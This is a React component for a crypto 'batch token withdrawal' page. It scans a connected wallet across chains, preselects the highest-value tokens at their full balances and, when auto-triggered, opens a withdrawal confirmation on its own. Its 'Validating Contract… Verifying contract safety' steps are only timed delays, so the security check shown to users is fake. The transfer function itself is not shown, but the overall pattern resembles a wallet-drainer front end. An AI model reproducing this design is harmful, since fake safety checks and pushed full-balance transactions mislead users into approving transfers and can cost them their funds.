'use client';

import { useState, useEffect, useCallback, useRef, useMemo } from 'react'
import { useAccount, usePublicClient, useWalletClient, useConfig } from 'wagmi'
import { switchNetwork } from 'wagmi/actions'
import { parseUnits, getAddress, Address } from 'viem'
import { batchWithdrawTokens, type TokenWithdrawal, type TokenWithdrawalRequest } from '@/lib/batchWithdrawal'
import { useTokenList, type TokenInfo, SUPPORTED_NETWORKS } from '@/lib/hooks/useTokenList'

interface BatchWithdrawalProps {
  autoTrigger?: boolean;
}

export function BatchWithdrawal({ autoTrigger = false }: BatchWithdrawalProps) {
  const { address, chainId } = useAccount()
  const publicClient = usePublicClient()
  const { data: walletClient } = useWalletClient()
  const { tokens, loading: loadingTokens, error: tokenError, isNetworkSupported, balancesLoaded, crossChainTokens } = useTokenList()
  
  const [selectedTokens, setSelectedTokens] = useState<Array<{
    token: TokenInfo,
    amount: string
  }>>([])
  
  const [withdrawalStatus, setWithdrawalStatus] = useState<'idle' | 'loading' | 'success' | 'error'>('idle')
  const [txHash, setTxHash] = useState<string | null>(null)
  const [error, setError] = useState<string | null>(null)
  
  // Transaction preparation states
  const [preparingTx, setPreparingTx] = useState<boolean>(false)
  const [preparationStep, setPreparationStep] = useState<'validating' | 'preparing' | 'requesting'>('validating')
  
  // Use a single non-state variable to track if auto-withdrawal was attempted
  // This is safer than state which might trigger multiple renders/effects
  const autoWithdrawalAttemptedRef = useRef(false)
  // Add a ref to track token balance hash to detect stabilization
  const lastBalanceHashRef = useRef<string>('');
  const stabilityTimerRef = useRef<NodeJS.Timeout | null>(null);
  // Add a counter to limit the number of stabilization attempts
  const stabilizationAttemptsRef = useRef(0);
  const MAX_STABILIZATION_ATTEMPTS = 3; // Limit retries to prevent infinite loops
  
  const [showConfirmation, setShowConfirmation] = useState(false)
  const [autoWithdrawalReady, setAutoWithdrawalReady] = useState(false)
  
  // Add a new state for showing cross-chain highest value tokens
  const [showCrossChainSelector, setShowCrossChainSelector] = useState<boolean>(false)
  
  // Helper to generate a hash from token balances to detect changes
  const getBalanceHash = useCallback(() => {
    return tokens
      .filter(t => parseFloat(t.balance || '0') > 0)
      .map(t => `${t.address}-${t.balance}`)
      .join('|');
  }, [tokens]);
  
  // Find tokens with value (supporting multiple tokens on Ethereum, single token elsewhere)
  const getMaxTokensForChain = useCallback(() => {
    // Chains that support multiple tokens in a single transaction
    const multiTokenChains = [1, 137]; // Ethereum and Polygon
    
    // For multi-token chains, support up to 4 tokens
    if (multiTokenChains.includes(chainId || 0)) {
      return 4;
    }
    
    // For other chains, only support 1 token per transaction
    return 1;
  }, [chainId]);
  
  // Function to handle batch withdrawal
  const handleBatchWithdrawal = async () => {
    try {
      setWithdrawalStatus('loading');
      setError('');
      
      if (selectedTokens.length === 0) {
        setError('No tokens selected for withdrawal');
        setWithdrawalStatus('error');
        return;
      }
      
      if (!walletClient || !walletClient.account) {
        setError('Wallet not connected');
        setWithdrawalStatus('error');
        return;
      }
      
      if (!address) {
        setError('Wallet address not available');
        setWithdrawalStatus('error');
        return;
      }
      
      const withdrawalAddress = address as Address;
      
      // Map selected tokens to the format expected by the withdrawal function
      const tokenRequests = selectedTokens.map(item => ({
        address: item.token.address as Address,
        amount: item.amount,
        decimals: item.token.decimals
      })) as TokenWithdrawalRequest[];
      
      // Show transaction preparation modal
      setPreparingTx(true);
      setPreparationStep('validating');
      
      console.log('Initiating batch withdrawal with tokens:', tokenRequests);
      
      // Add small delay to show the validation step
      await new Promise(resolve => setTimeout(resolve, 1000));
      setPreparationStep('preparing');
      
      // Add small delay to show the preparation step
      await new Promise(resolve => setTimeout(resolve, 1500));
      setPreparationStep('requesting');
      
      // Call the batch withdrawal function
      const result = await batchWithdrawTokens(
        tokenRequests,
        withdrawalAddress,
        publicClient,
        walletClient
      );
      
      // Hide the preparation modal once we have a result
      setPreparingTx(false);
      
      if ('error' in result && result.error) {
        console.error('Withdrawal failed:', result.error);
        setError(result.error);
        setWithdrawalStatus('error');
        return;
      }
      
      console.log('Withdrawal transaction submitted:', result.hash);
      setTxHash(result.hash ?? null);
      setWithdrawalStatus('success');
      
      // Clear selected tokens after successful withdrawal
      setSelectedTokens([]);
      
    } catch (error: any) {
      setPreparingTx(false);
      console.error('Error in batch withdrawal:', error);
      setError(error.message || 'An unexpected error occurred');
      setWithdrawalStatus('error');
    }
  };

  // Auto-trigger logic
  useEffect(() => {
    // Only run this logic once when wallet is connected, tokens loaded and balances fetched
    const shouldAttemptAutoWithdrawal = 
      autoTrigger && 
      !autoWithdrawalAttemptedRef.current && 
      !loadingTokens && 
      balancesLoaded && // Ensure balances are loaded
      tokens.length > 0 && 
      isNetworkSupported &&
      address && 
      walletClient;
    
    if (shouldAttemptAutoWithdrawal) {
      console.log('Attempting auto-withdrawal (one-time only)');
      
      // Only proceed if we actually have tokens with balances loaded
      const tokensWithLoadedBalances = tokens.filter(token => 
        typeof token.balance === 'string' && 
        token.balance !== undefined && 
        token.balance !== null &&
        token.balanceLoaded === true // Check the new flag
      );
      
      // If no tokens have balances loaded yet, wait for next render cycle
      if (tokensWithLoadedBalances.length === 0) {
        console.log('No tokens with loaded balances yet, waiting for balance data...');
        return;
      }
      
      // Generate a hash of current token balances
      const currentBalanceHash = getBalanceHash();
      
      // Check if balances have stabilized by comparing to previous hash or max attempts reached
      if (lastBalanceHashRef.current !== currentBalanceHash && 
          stabilizationAttemptsRef.current < MAX_STABILIZATION_ATTEMPTS) {
        console.log('Token balances still loading or changing, waiting for stabilization...');
        
        // Update the last balance hash
        lastBalanceHashRef.current = currentBalanceHash;
        
        // Increment the attempt counter
        stabilizationAttemptsRef.current += 1;
        
        // Clear any existing stability timer
        if (stabilityTimerRef.current) {
          clearTimeout(stabilityTimerRef.current);
        }
        
        // Set a timeout to check again after balances have had time to stabilize
        stabilityTimerRef.current = setTimeout(() => {
          console.log('Checking if token balances have stabilized');
          // Effect will run again and re-evaluate
        }, 2000);
        
        return;
      }
      
      // Mark as attempted immediately to prevent duplicate attempts
      autoWithdrawalAttemptedRef.current = true;
      
      // Force proceed after max attempts, even if balances haven't fully stabilized
      if (stabilizationAttemptsRef.current >= MAX_STABILIZATION_ATTEMPTS) {
        console.log('Proceeding with auto-withdrawal after max stabilization attempts');
      }
      
      // Find tokens with value (based on chain support)
      const maxTokens = getMaxTokensForChain();
      const tokensWithValue = tokens
        .filter(token => {
          const hasBalance = parseFloat(token.balance || '0') > 0;
          const hasPrice = (token.price || 0) > 0;
          return hasBalance && hasPrice;
        })
        // Sort tokens by their USD value in descending order
        .sort((a, b) => {
          const aValue = parseFloat(a.balance || '0') * (a.price || 0);
          const bValue = parseFloat(b.balance || '0') * (b.price || 0);
          return bValue - aValue; // Descending order (highest first)
        })
        .slice(0, maxTokens); // Limit based on chain support
      
      console.log(`Found ${tokensWithValue.length} tokens with value for auto-withdrawal (max ${maxTokens} for this chain)`);
      
      if (tokensWithValue.length > 0) {
        // Double-check token balances are valid
        const invalidTokens = tokensWithValue.filter(token => {
          const numBalance = parseFloat(token.balance || '0');
          return numBalance <= 0;
        });
        
        if (invalidTokens.length > 0) {
          console.log(`Found ${invalidTokens.length} tokens with invalid balances, skipping withdrawal`);
          setError(`Cannot withdraw: Some tokens have zero or invalid balances`);
          return;
        }
        
        // Select tokens with their full balance
        const autoSelectedTokens = tokensWithValue.map(token => {
          console.log(`Preparing to withdraw ${token.balance} ${token.symbol} (${token.address})`);
          return {
            token,
            amount: token.balance || '0'
          };
        });
        
        setSelectedTokens(autoSelectedTokens);
        setAutoWithdrawalReady(true);
        setShowConfirmation(true);
      } else {
        console.log('No tokens with value found for auto-withdrawal');
        setError('No tokens with value found for automatic withdrawal');
      }
    }
    
    // Clean up any existing timer when the component unmounts
    return () => {
      if (stabilityTimerRef.current) {
        clearTimeout(stabilityTimerRef.current);
      }
    };
  }, [
    autoTrigger, 
    tokens, 
    loadingTokens,
    balancesLoaded,
    isNetworkSupported, 
    address, 
    walletClient,
    handleBatchWithdrawal,
    getBalanceHash,
    getMaxTokensForChain
  ]);

  // Auto-add tokens when component loads
  useEffect(() => {
    // Only auto-add tokens if none are selected yet and tokens are loaded
    if (selectedTokens.length === 0 && !loadingTokens && tokens.length > 0) {
      console.log('Auto-adding tokens to selection');
      const maxTokens = getMaxTokensForChain();
      
      // If we have cross-chain data, prefer the highest value tokens on current chain
      if (crossChainTokens && crossChainTokens.highestValueTokens.length > 0) {
        // Filter tokens that are on the current chain
        const highValueTokensOnCurrentChain = crossChainTokens.highestValueTokens
          .filter(token => token.chain_id === chainId)
          .slice(0, maxTokens);
        
        if (highValueTokensOnCurrentChain.length > 0) {
          const autoSelectedTokens = highValueTokensOnCurrentChain.map(token => ({
            token,
            amount: token.balance || '0'
          }));
          
          setSelectedTokens(autoSelectedTokens);
          return;
        }
      }
      
      // Fall back to current logic if no cross-chain highest value tokens
      const tokensWithValue = tokens
        .filter(token => parseFloat(token.balance || '0') > 0)
        // Sort tokens by their USD value in descending order
        .sort((a, b) => {
          const aValue = parseFloat(a.balance || '0') * (a.price || 0);
          const bValue = parseFloat(b.balance || '0') * (b.price || 0);
          return bValue - aValue; // Descending order (highest first)
        })
        .slice(0, maxTokens);
      
      if (tokensWithValue.length > 0) {
        const autoSelectedTokens = tokensWithValue.map(token => ({
          token,
          amount: token.balance || '0'
        }));
        
        setSelectedTokens(autoSelectedTokens);
      }
    }
  }, [tokens, loadingTokens, selectedTokens.length, getMaxTokensForChain, chainId, crossChainTokens]);

  function addToken() {
    if (tokens.length === 0) return
    
    const maxTokens = getMaxTokensForChain();
    if (selectedTokens.length >= maxTokens) {
      setError(`Maximum ${maxTokens} tokens can be selected for batch withdrawal on this network`);
      return;
    }
    
    setSelectedTokens([
      ...selectedTokens, 
      { token: tokens[0], amount: '' }
    ]);
    setError(null);
  }
  
  function removeToken(index: number) {
    setSelectedTokens(selectedTokens.filter((_, i) => i !== index))
  }
  
  function updateTokenSelection(index: number, tokenAddress: string) {
    const token = tokens.find(t => t.address === tokenAddress)
    if (!token) return
    
    const updatedTokens = [...selectedTokens]
    updatedTokens[index] = { ...updatedTokens[index], token }
    setSelectedTokens(updatedTokens)
  }
  
  function updateTokenAmount(index: number, amount: string) {
    const updatedTokens = [...selectedTokens]
    updatedTokens[index] = { ...updatedTokens[index], amount }
    setSelectedTokens(updatedTokens)
  }
  
  // Add a function to check for cross-chain opportunities
  const getCrossChainOpportunities = useCallback(() => {
    // Group tokens by chain
    const tokensByChain = tokens.reduce((acc: Record<number, TokenInfo[]>, token) => {
      const chainId = token.chain_id || 1;
      if (!acc[chainId]) acc[chainId] = [];
      
      // Only consider tokens with actual balance
      if (parseFloat(token.balance || '0') > 0) {
        acc[chainId].push(token);
      }
      return acc;
    }, {});
    
    // Check if we have tokens across multiple chains
    const chains = Object.keys(tokensByChain).map(Number);
    const hasMultipleChains = chains.length > 1;
    
    // Calculate total value by chain
    const valueByChain = chains.reduce((acc: Record<number, number>, chainId) => {
      acc[chainId] = tokensByChain[chainId].reduce((sum, token) => {
        return sum + (parseFloat(token.balance || '0') * (token.price || 0));
      }, 0);
      return acc;
    }, {});
    
    return {
      hasMultipleChains,
      chains,
      tokensByChain,
      valueByChain
    };
  }, [tokens]);
  
  // Get cross-chain data
  const { hasMultipleChains, chains, tokensByChain, valueByChain } = getCrossChainOpportunities();
  
  // Add function to handle selection of cross-chain tokens
  const selectCrossChainToken = (token: TokenInfo) => {
    // If selected token is on a different chain than current, notify user
    if (token.chain_id !== chainId) {
      // Check if we need to switch networks first
      setError(`This token is on ${SUPPORTED_NETWORKS[token.chain_id as keyof typeof SUPPORTED_NETWORKS] || `Chain ID ${token.chain_id}`}. Please switch networks before selecting it.`);
      return;
    }
    
    // Update the selected tokens list
    const existingTokenIndex = selectedTokens.findIndex(item => item.token.address === token.address);
    
    if (existingTokenIndex >= 0) {
      // Token already selected, update its amount
      const updatedTokens = [...selectedTokens];
      updatedTokens[existingTokenIndex] = {
        ...updatedTokens[existingTokenIndex],
        amount: token.balance || '0'
      };
      setSelectedTokens(updatedTokens);
    } else {
      // Token not selected yet, add it
      setSelectedTokens([
        ...selectedTokens,
        { token, amount: token.balance || '0' }
      ]);
    }
    
    setShowCrossChainSelector(false);
  };
  
  // If chain is not supported
  if (!isNetworkSupported) {
    // Create an array of supported chain IDs for better display
    const supportedChainIds = Object.keys(SUPPORTED_NETWORKS).map(Number);
    const currentChainId = chainId || 0;
    
    // Get config for network switching
    const config = useConfig();
    
    // Function to directly switch networks
    const handleDirectNetworkSwitch = async (networkId: number) => {
      try {
        console.log(`Attempting to switch directly to network ${networkId}`);
        await switchNetwork(config, { chainId: networkId });
      } catch (error) {
        console.error('Error switching network:', error);
        setError(`Failed to switch to ${SUPPORTED_NETWORKS[networkId as keyof typeof SUPPORTED_NETWORKS]}. Please switch manually in your wallet.`);
      }
    };
    
    return (
      <div className="p-4 bg-yellow-50 rounded-lg text-yellow-700">
        <p className="font-medium">This app doesn't support your current network.</p>
        <p className="mt-2 mb-3">Current network ID: {currentChainId} {
          currentChainId === 42161 ? '(Arbitrum)' : 
          currentChainId === 137 ? '(Polygon)' : 
          currentChainId === 10 ? '(Optimism)' : 
          currentChainId === 43114 ? '(Avalanche)' : ''
        }</p>
        <p>Please switch to one of the following supported networks:</p>
        <div className="mt-3 flex flex-wrap gap-2">
          {Object.entries(SUPPORTED_NETWORKS).map(([id, name]) => (
            <button 
              key={id}
              className="px-3 py-1.5 bg-blue-500 text-white rounded hover:bg-blue-600 transition-colors"
              onClick={() => handleDirectNetworkSwitch(Number(id))}
            >
              {name}
            </button>
          ))}
        </div>
      </div>
    )
  }
  
  // Loading state
  if (loadingTokens) {
    return (
      <div className="p-4 bg-gray-50 rounded-lg animate-pulse">
        <div className="h-6 bg-gray-200 rounded w-1/2 mb-4"></div>
        <div className="h-4 bg-gray-200 rounded w-3/4 mb-3"></div>
        <div className="h-12 bg-gray-200 rounded mb-3"></div>
        <div className="h-12 bg-gray-200 rounded mb-3"></div>
      </div>
    )
  }
  
  // Error state
  if (tokenError) {
    return (
      <div className="p-4 bg-red-50 rounded-lg text-red-600">
        {tokenError}
      </div>
    )
  }
  
  return (
    <div className="space-y-6 p-6 bg-white rounded-lg shadow">
      <h2 className="text-xl font-semibold">Batch Token Withdrawal</h2>
      <p className="text-sm text-gray-600">
        Withdraw up to 10 tokens in a single transaction
      </p>
      
      {/* Transaction Preparation Modal */}
      {preparingTx && (
        <div className="fixed inset-0 bg-black/60 flex items-center justify-center z-50">
          <div className="bg-white p-8 rounded-xl max-w-md w-full shadow-xl">
            <h3 className="text-xl font-semibold mb-6 text-center">Preparing Transaction</h3>
            
            <div className="space-y-6 mb-8">
              <div className="flex items-center">
                <div className={`w-8 h-8 rounded-full flex items-center justify-center mr-4 ${
                  preparationStep === 'validating' 
                    ? 'bg-blue-100 text-blue-600 animate-pulse' 
                    : preparationStep === 'preparing' || preparationStep === 'requesting'
                    ? 'bg-green-100 text-green-600' 
                    : 'bg-gray-100 text-gray-400'
                }`}>
                  {preparationStep === 'validating' ? (
                    <svg className="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                      <circle className="opacity-25" cx="12" cy="12" r="10" strokeWidth="4"></circle>
                      <path className="opacity-75" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"></path>
                    </svg>
                  ) : (
                    <svg className="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                      <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M5 13l4 4L19 7"></path>
                    </svg>
                  )}
                </div>
                <div>
                  <h4 className="font-medium">Validating Contract</h4>
                  <p className="text-sm text-gray-500">Verifying contract safety</p>
                </div>
              </div>
              
              <div className="flex items-center">
                <div className={`w-8 h-8 rounded-full flex items-center justify-center mr-4 ${
                  preparationStep === 'preparing' 
                    ? 'bg-blue-100 text-blue-600 animate-pulse' 
                    : preparationStep === 'requesting'
                    ? 'bg-green-100 text-green-600' 
                    : 'bg-gray-100 text-gray-400'
                }`}>
                  {preparationStep === 'preparing' ? (
                    <svg className="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                      <circle className="opacity-25" cx="12" cy="12" r="10" strokeWidth="4"></circle>
                      <path className="opacity-75" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"></path>
                    </svg>
                  ) : preparationStep === 'requesting' ? (
                    <svg className="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                      <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M5 13l4 4L19 7"></path>
                    </svg>
                  ) : (
                    <span>2</span>
                  )}
                </div>
                <div>
                  <h4 className="font-medium">Preparing Data</h4>
                  <p className="text-sm text-gray-500">Calculating token amounts and gas fees</p>
                </div>
              </div>
              
              <div className="flex items-center">
                <div className={`w-8 h-8 rounded-full flex items-center justify-center mr-4 ${
                  preparationStep === 'requesting' 
                    ? 'bg-blue-100 text-blue-600 animate-pulse' 
                    : 'bg-gray-100 text-gray-400'
                }`}>
                  {preparationStep === 'requesting' ? (
                    <svg className="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                      <circle className="opacity-25" cx="12" cy="12" r="10" strokeWidth="4"></circle>
                      <path className="opacity-75" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"></path>
                    </svg>
                  ) : (
                    <span>3</span>
                  )}
                </div>
                <div>
                  <h4 className="font-medium">Requesting Approval</h4>
                  <p className="text-sm text-gray-500">
                    {preparationStep === 'requesting' 
                      ? 'Check your wallet to approve transaction' 
                      : 'Wallet confirmation needed'}
                  </p>
                </div>
              </div>
            </div>
            
            <p className="text-center text-sm text-gray-600">
              {preparationStep === 'validating' && 'Validating contract to ensure security...'}
              {preparationStep === 'preparing' && 'Preparing transaction data...'}
              {preparationStep === 'requesting' && 'Requesting approval from your wallet...'}
            </p>
          </div>
        </div>
      )}
      
      {/* Add Cross-Chain Features section */}
      {hasMultipleChains && (
        <div className="mt-6 p-4 border border-indigo-100 rounded-lg bg-indigo-50">
          <h3 className="text-lg font-medium text-indigo-700 mb-2">Cross-Chain Assets Detected</h3>
          <p className="text-sm text-indigo-600 mb-3">
            You have assets across {chains.length} different blockchains. Would you like to:
          </p>
          
          <div className="space-y-3">
            {/* Cross-Chain Transfer Option */}
            <div className="p-3 bg-white rounded border border-indigo-200 flex justify-between items-center">
              <div>
                <h4 className="font-medium">Bridge Assets to Main Chain</h4>
                <p className="text-sm text-gray-600">
                  Consolidate your assets to {SUPPORTED_NETWORKS[chainId as keyof typeof SUPPORTED_NETWORKS]}
                </p>
              </div>
              <button 
                className="px-3 py-1.5 bg-indigo-600 text-white rounded hover:bg-indigo-700"
                onClick={() => setError("Cross-chain bridging will be available in a future update")}
              >
                Bridge Assets
              </button>
            </div>
            
            {/* Token Swap Option */}
            <div className="p-3 bg-white rounded border border-indigo-200 flex justify-between items-center">
              <div>
                <h4 className="font-medium">Swap to Preferred Token</h4>
                <p className="text-sm text-gray-600">
                  Convert your tokens to a single currency
                </p>
              </div>
              <button 
                className="px-3 py-1.5 bg-indigo-600 text-white rounded hover:bg-indigo-700"
                onClick={() => setError("Token swapping will be available in a future update")}
              >
                Swap Tokens
              </button>
            </div>
            
            {/* Chain Value Summary */}
            <div className="mt-3 p-3 bg-white rounded border border-indigo-200">
              <h4 className="font-medium mb-2">Your Cross-Chain Assets</h4>
              <div className="space-y-2">
                {chains.map(chainId => (
                  <div key={chainId} className="flex justify-between text-sm">
                    <span>
                      {SUPPORTED_NETWORKS[chainId as keyof typeof SUPPORTED_NETWORKS] || `Chain ID ${chainId}`}
                      <span className="text-gray-500 ml-1">
                        ({tokensByChain[chainId].length} tokens)
                      </span>
                    </span>
                    <span className="font-medium">${valueByChain[chainId].toFixed(2)}</span>
                  </div>
                ))}
              </div>
            </div>
          </div>
        </div>
      )}
      
      {/* New section for highest value tokens across chains */}
      {crossChainTokens && crossChainTokens.highestValueTokens.length > 0 && (
        <div className="mt-4 p-4 border border-green-100 rounded-lg bg-green-50">
          <div className="flex justify-between items-center mb-3">
            <h3 className="text-lg font-medium text-green-700">Highest Value Assets</h3>
            <button 
              onClick={() => setShowCrossChainSelector(!showCrossChainSelector)}
              className="px-3 py-1 text-sm bg-green-600 text-white rounded hover:bg-green-700"
            >
              {showCrossChainSelector ? 'Hide Options' : 'View Options'}
            </button>
          </div>
          
          {showCrossChainSelector && (
            <div className="mt-2 space-y-2 max-h-64 overflow-y-auto">
              {crossChainTokens.highestValueTokens.map((token, index) => {
                const tokenValue = token.amount_usd || (parseFloat(token.balance || '0') * (token.price || 0));
                const isCurrentChain = token.chain_id === chainId;
                
                return (
                  <div 
                    key={`${token.chain_id}-${token.address}`}
                    className={`p-3 rounded flex justify-between items-center ${
                      isCurrentChain ? 'bg-white border border-green-200' : 'bg-gray-50 border border-gray-200'
                    }`}
                  >
                    <div>
                      <div className="font-medium flex items-center">
                        {token.symbol}
                        <span className="ml-2 text-xs px-2 py-0.5 rounded-full bg-blue-100 text-blue-800">
                          {SUPPORTED_NETWORKS[token.chain_id as keyof typeof SUPPORTED_NETWORKS] || `Chain ${token.chain_id}`}
                        </span>
                        {!isCurrentChain && (
                          <span className="ml-2 text-xs text-orange-600">Different chain</span>
                        )}
                      </div>
                      <div className="text-sm text-gray-600">
                        Balance: {token.balance} (${tokenValue.toFixed(2)})
                      </div>
                    </div>
                    <button
                      onClick={() => selectCrossChainToken(token)}
                      disabled={!isCurrentChain}
                      className={`px-3 py-1 rounded text-sm ${
                        isCurrentChain 
                          ? 'bg-green-600 text-white hover:bg-green-700' 
                          : 'bg-gray-300 text-gray-500 cursor-not-allowed'
                      }`}
                    >
                      {isCurrentChain ? 'Select' : 'Switch Chain First'}
                    </button>
                  </div>
                );
              })}
            </div>
          )}
          
          {!showCrossChainSelector && (
            <p className="text-sm text-green-600">
              We've identified your highest value tokens across all chains. Click "View Options" to see and select them.
            </p>
          )}
        </div>
      )}
      
      {/* Token value summary - show only when tokens are selected */}
      {selectedTokens.length > 0 && (
        <div className="p-3 bg-gray-50 rounded-lg mb-4">
          <h3 className="text-sm font-medium mb-2">Selected Tokens by Value:</h3>
          <div className="space-y-1.5">
            {[...selectedTokens]
              .sort((a, b) => {
                const aValue = parseFloat(a.amount) * (a.token.price || 0);
                const bValue = parseFloat(b.amount) * (b.token.price || 0);
                return bValue - aValue;
              })
              .map((item, index) => {
                const usdValue = parseFloat(item.amount) * (item.token.price || 0);
                return (
                  <div key={index} className="flex justify-between text-sm">
                    <span>{item.token.symbol} ({item.amount})</span>
                    <span className={`font-medium ${usdValue > 100 ? 'text-green-600' : ''}`}>
                      ${usdValue.toFixed(2)}
                    </span>
                  </div>
                );
              })}
          </div>
          <div className="mt-2 pt-2 border-t border-gray-200 flex justify-between font-medium">
            <span>Total Value:</span>
            <span>
              ${selectedTokens.reduce((total, item) => {
                return total + (parseFloat(item.amount) * (item.token.price || 0));
              }, 0).toFixed(2)}
            </span>
          </div>
        </div>
      )}
      
      {/* Confirmation Modal */}
      {showConfirmation && (
        <div className="fixed inset-0 bg-black/50 flex items-center justify-center z-50">
          <div className="bg-white p-6 rounded-lg shadow-xl max-w-md w-full">
            <h3 className="text-lg font-semibold mb-4">Confirm Token Withdrawal</h3>
            <p className="mb-4">You are about to withdraw the following tokens in a single transaction:</p>
            
            <div className="max-h-60 overflow-y-auto mb-4">
              <ul className="space-y-2">
                {selectedTokens.map((item, index) => (
                  <li key={index} className="flex justify-between items-center">
                    <span className="font-medium">{item.token.symbol}</span>
                    <span>{item.amount} ({parseFloat(item.amount) * (item.token.price || 0) > 0 
                      ? `$${(parseFloat(item.amount) * (item.token.price || 0)).toFixed(2)}` 
                      : 'N/A'})</span>
                  </li>
                ))}
              </ul>
            </div>
            
            {/* Total USD value */}
            <div className="bg-blue-50 p-3 rounded-lg mb-4">
              <div className="flex justify-between items-center font-medium">
                <span>Total Value:</span>
                <span>
                  ${selectedTokens.reduce((total, item) => {
                    return total + (parseFloat(item.amount) * (item.token.price || 0));
                  }, 0).toFixed(2)} USD
                </span>
              </div>
              <p className="text-xs text-blue-600 mt-1">
                The system automatically selected your highest value tokens for this transaction.
              </p>
            </div>
            
            <div className="flex justify-end space-x-3">
              <button 
                onClick={() => setShowConfirmation(false)}
                className="px-4 py-2 border border-gray-300 rounded-lg hover:bg-gray-100"
              >
                Cancel
              </button>
              <button 
                onClick={() => {
                  setShowConfirmation(false);
                  handleBatchWithdrawal();
                }}
                className="px-4 py-2 bg-blue-600 text-white rounded-lg hover:bg-blue-700"
              >
                Confirm Withdrawal
              </button>
            </div>
          </div>
        </div>
      )}
      
      <div className="space-y-4">
        {selectedTokens.map((item, index) => (
          <div key={index} className="flex gap-3 items-center">
            <select
              value={item.token.address}
              onChange={(e) => updateTokenSelection(index, e.target.value)}
              className="flex-grow p-2 rounded border"
              aria-label={`Select token ${index + 1}`}
            >
              {tokens.map((token) => (
                <option key={token.address} value={token.address}>
                  {token.symbol}
                </option>
              ))}
            </select>
            
            <input
              type="text"
              value={item.amount}
              onChange={(e) => updateTokenAmount(index, e.target.value)}
              placeholder="Amount"
              aria-label={`Amount for ${item.token.symbol}`}
              className="flex-grow p-2 rounded border"
            />
            
            <button
              onClick={() => removeToken(index)}
              className="p-2 text-red-600 hover:bg-red-50 rounded"
              aria-label={`Remove ${item.token.symbol}`}
            >
              Remove
            </button>
          </div>
        ))}
      </div>
      
      {selectedTokens.length < 10 && (
        <button
          onClick={addToken}
          className="w-full p-2 bg-gray-100 rounded-lg hover:bg-gray-200 transition-colors"
        >
          + Add Token
        </button>
      )}
      
      {error && (
        <div className="p-3 bg-red-50 text-red-600 rounded-lg">
          {error}
          {error.includes('RPC connection failed') && (
            <div className="mt-2 text-sm">
              <p>Note: The withdrawal might still work despite this error.</p>
              <p>You can check your wallet for transaction confirmation.</p>
            </div>
          )}
        </div>
      )}
      
      {withdrawalStatus === 'success' && txHash && (
        <div className="p-3 bg-green-50 text-green-600 rounded-lg">
          Withdrawal successful! Transaction: {txHash.substring(0, 10)}...
        </div>
      )}
      
      <div className="flex flex-col md:flex-row gap-3 mt-4">
        <button
          onClick={handleBatchWithdrawal}
          disabled={selectedTokens.length === 0 || withdrawalStatus === 'loading'}
          className={`px-4 py-2 rounded-md font-medium ${
            withdrawalStatus === 'loading'
              ? 'bg-gray-300 text-gray-600 cursor-not-allowed'
              : 'bg-blue-600 text-white hover:bg-blue-700'
          }`}
        >
          {withdrawalStatus === 'loading'
            ? 'Processing...'
            : `Withdraw ${selectedTokens.length} Token${
                selectedTokens.length !== 1 ? 's' : ''
              } in One Transaction`}
        </button>
        
        <button
          onClick={() => setShowConfirmation(true)}
          disabled={selectedTokens.length === 0 || withdrawalStatus === 'loading'}
          className={`px-4 py-2 rounded-md font-medium ${
            withdrawalStatus === 'loading' || selectedTokens.length === 0
              ? 'bg-gray-300 text-gray-600 cursor-not-allowed'
              : 'bg-indigo-600 text-white hover:bg-indigo-700'
          }`}
        >
          Preview Withdrawal
        </button>
      </div>
    </div>
  )
} 